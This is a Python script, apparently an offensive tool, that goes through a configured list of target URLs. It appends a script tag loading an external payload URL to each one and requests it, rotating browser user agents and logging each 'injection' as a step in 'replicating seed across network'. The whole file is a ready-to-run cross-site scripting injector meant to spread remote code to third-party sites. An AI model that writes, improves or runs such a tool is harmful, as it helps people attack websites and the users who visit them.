import time
import requests
import json
import random
import argparse
import logging
from urllib.parse import urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Load configuration from a JSON file
def load_config(config_file):
    with open(config_file, 'r') as file:
        return json.load(file)

# Setup logging
def setup_logging():
    logging.basicConfig(filename='replication.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Validate URL
def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Main replication function
def begin_replication(target, config):
    print(f"[♻️] Replicating seed across network from {target}")
    logging.info(f"Replicating seed across network from {target}")

    known_targets = config['targets']
    payload_url = config['payload_url']
    injected_script = f"<script src='{payload_url}'></script>"

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
    ]

    headers = {
        "User-Agent": random.choice(user_agents)
    }

    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))

    last_request_time = time.time()
    rate_limit_interval = 1  # seconds

    for t in known_targets:
        if not validate_url(t):
            print(f"[!] Invalid URL: {t}")
            logging.error(f"Invalid URL: {t}")
            continue

        last_request_time = rate_limit(last_request_time, rate_limit_interval)

        try:
            full_url = f"{t}{injected_script}"
            print(f"[🧬] Injecting into: {full_url}")
            logging.info(f"Injecting into: {full_url}")
            r = session.get(full_url, headers=headers, timeout=10)
            print(f"[+] Status {r.status_code} from {t}")
            logging.info(f"Status {r.status_code} from {t}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Failed to reach {t}: {e}")
            logging.error(f"Failed to reach {t}: {e}")

    print("[✔️] Replication cycle complete.")
    logging.info("Replication cycle complete.")

# Rate limiting function
def rate_limit(last_request_time, rate_limit_interval=1):
    current_time = time.time()
    elapsed_time = current_time - last_request_time
    if elapsed_time < rate_limit_interval:
        time.sleep(rate_limit_interval - elapsed_time)
    return current_time

# Main entry point
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Replicate a payload across a network.")
    parser.add_argument('--target', required=True, help='Initial target URL')
    parser.add_argument('--config', default='config.json', help='Path to configuration file')
    args = parser.parse_args()

    setup_logging()
    config = load_config(args.config)
    begin_replication(args.target, config)